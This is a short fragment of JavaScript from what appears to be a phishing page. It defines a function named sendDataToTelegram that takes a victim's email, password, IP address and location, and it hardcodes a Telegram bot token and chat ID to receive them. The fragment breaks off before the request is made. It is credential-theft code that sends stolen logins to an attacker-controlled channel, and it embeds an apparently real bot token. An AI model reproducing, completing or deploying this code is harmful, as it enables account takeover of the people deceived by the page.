<script>
  ...
  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
    const botToken = '8474475803:AAGBtnK8ESP-1sjEHsI-EdVBqEWsfT8qRpQ'; // Replace with your(others) Telegram bot token
      const chatId = '6444406657'; // Replace with your(others) Telegram chat ID
